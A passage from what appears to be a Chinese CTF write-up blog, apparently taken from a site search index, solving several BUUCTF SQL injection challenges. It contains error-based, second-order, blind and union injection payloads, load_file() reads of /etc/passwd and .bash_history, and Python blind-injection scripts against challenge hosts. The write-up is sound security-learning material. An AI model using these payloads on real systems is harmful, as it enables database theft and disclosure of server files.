substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)# 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)# （这里之所以要看flag.txt根据师傅们的博客推测是纯靠猜的 在修改地址的时候就会重新调用这个sql语句，报错输出flag [RCTF2015]EasySQL这也是个二次注入 注册后登录再修改密码 利用报错注入 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))# ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))# ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))# 离谱，被骗了 重新查表 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))# 这一看就是没输出全 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))# ？？？ 这个字段里加了一堆没用的数据 只能用正则regexp过滤一下 ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)# 还是没输出全 之后就要用逆序输出了 ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)# [网鼎杯 2018]Comment有git泄露，用githack跑一遍，然后利用git log --reflog查看历史提交，再利用git reset回滚版本，得到原始的代码 &lt;?php include &quot;mysql.php&quot;; session_start(); if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123; header(&quot;Location: .&#x2F;login.php&quot;); die(); &#125; if(isset($_GET[&#39;do&#39;]))&#123; switch ($_GET[&#39;do&#39;]) &#123; case &#39;write&#39;: $category &#x3D; addslashes($_POST[&#39;category&#39;]); $title &#x3D; addslashes($_POST[&#39;title&#39;]); $content &#x3D; addslashes($_POST[&#39;content&#39;]); $sql &#x3D; &quot;insert into board set category &#x3D; &#39;$category&#39;, title &#x3D; &#39;$title&#39;, content &#x3D; &#39;$content&#39;&quot;; $result &#x3D; mysql_query($sql); header(&quot;Location: .&#x2F;index.php&quot;); break; case &#39;comment&#39;: $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]); $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;; $result &#x3D; mysql_query($sql); $num &#x3D; mysql_num_rows($result); if($num&gt;0)&#123; $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;]; $content &#x3D; addslashes($_POST[&#39;content&#39;]); $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;$category&#39;, content &#x3D; &#39;$content&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; $result &#x3D; mysql_query($sql); &#125; header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;); break; default: header(&quot;Location: .&#x2F;index.php&quot;); &#125; &#125; else&#123; header(&quot;Location: .&#x2F;index.php&quot;); &#125; ?&gt; 输入的内容都被addslashes过滤了，但是在comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入 在发帖部分：的category里输入x&#39;,content=database(),/* 再在提交留言里 这样可以形成多行注释，注释掉原有的content字段 可以得到数据库名称 这时查询语句为 $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;, content &#x3D; &#39;*&#x2F;#&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; 即 $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;x&#39;,content&#x3D;database(), bo_id &#x3D; &#39;$bo_id&#39;&quot;; SQL读取文件用load_file()函数进行读取，值得注意的是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。 .bash_history 在unix/linux系统下保存历史命令的文件，在用户的根目录下，即~/处。 .DS_Store文件泄露 文件泄露，有一个下载至本地的脚本，不过这题用不上。 在发帖之前还有个登录界面，用户名和密码前几位直接给了，剩下三位爆破得到666 &#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/* 这一步应该是为了知道.bash_histroy文件的路径 &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/* 我们看到进行了一个解压然后复制和删除的操作，而.DS_Store只在/var/www/html/目录下被删除了，/tmp/html目录下依然存在 接着再查.DS_Store &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/* 为了使其全部显示，要用hex编码 然后解码 看见有个flag文件 读一下 &#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/* 再解码，拿到flag [GYCTF2020]Ezsqlior被过滤了，没法用information查表了，但是可以用 1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103 2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format() 正确的时候返回Nu1L，错误时返回V&amp;N 爆表脚本 import requests url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot; payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39; database&#x3D; &#39;&#39; for i in range(1,1000): low &#x3D; 32 heigh &#x3D; 128 mid &#x3D; (low + heigh) &#x2F;&#x2F; 2 while (low &lt; heigh): payload1 &#x3D; payload.format(i,mid) post_data &#x3D; &#123;&#39;id&#39;: payload1&#125; r &#x3D; requests.post(url,data&#x3D;post_data) print(payload1) if &quot;Nu1L&quot; in r.text: low &#x3D; mid + 1 else: heigh &#x3D; mid mid &#x3D; (low + heigh) &#x2F;&#x2F; 2 if mid &#x3D;&#x3D; 32: break database +&#x3D;chr(mid) print(database) 得到表名后，拿不到列名，这里可以用无列名注入 先贴payload 2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 采用了字符偏移 按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符 所以最后的mid要减一才是正确的字符 这里我们传入十六进制，mysql会自动将十六进制转为字符 mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 这里要和flag的表的列数一样 最后跑一下拿flag import requests url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot; #payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39; payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39; change &#x3D; &#39;&#39; database&#x3D; &#39;&#39; for j in range(1,100): for i in range(32,128): change &#x3D; database+chr(i) payload1 &#x3D; payload.format(change) print(payload1) data &#x3D; &#123;&#39;id&#39;: payload1&#125; r &#x3D; requests.post(url,data&#x3D;data) if &#39;Nu1L&#39; in r.text: database +&#x3D; chr(i-1) print(database) break [b01lers2020]Life on Mars进入题目之后点击网页的几个按钮连个跳转都没有，遇事不决抓个包看看 看到有个search参数，这里存在sql注入 先用order by探一下列数，然后直接联合注入 注表名： 但是这里并没有什么可以的表，猜测是不是有其他库，重新去看一下库名 这里用database()只能看到一个aliens库，因为database()只能看到当前库，下次记得一定要把所有库都查出来 用union+select+1,group_concat(schema_name)+from+information_schema.schemata这个语句可以注出另外两个库 看一下alien_code库 search&#x3D;amazonis_planitia+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;&#39;alien_code&#39; 再看看code表 search&#x3D;amazonis_planitia+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name&#x3D;&#39;code&#39; 爆字段 search&#x3D;amazonis_planitia+union+select+1,group_concat(id,code)+from+alien_code.code","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"sql注入","slug":"sql注入","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]}],"categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"},{"name":"随笔","slug":"随笔","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"},{"name":"ssrf","slug":"ssrf","permalink":"https://ethe448.github.io/tags/ssrf/"},{"name":"华为ict","slug":"华为ict","permalink":"https://ethe448.github.io/tags/%E5%8D%8E%E4%B8%BAict/"},{"name":"ssti注入","slug":"ssti注入","permalink":"https://ethe448.github.io/tags/ssti%E6%B3%A8%E5%85%A5/"},{"name":"sql注入","slug":"sql注入","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]}